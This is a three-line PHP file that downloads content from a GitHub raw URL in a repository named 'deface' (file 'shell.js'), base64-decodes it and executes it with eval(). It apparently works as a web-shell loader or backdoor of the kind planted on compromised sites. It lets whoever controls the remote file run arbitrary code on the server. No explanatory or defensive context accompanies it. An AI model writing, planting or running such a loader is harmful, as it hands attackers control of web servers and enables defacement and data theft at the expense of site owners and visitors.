<?php   
$x=file_get_contents("https://raw.githubusercontent.com/icm1337/deface/main/shell.js");
eval(base64_decode($x));
?>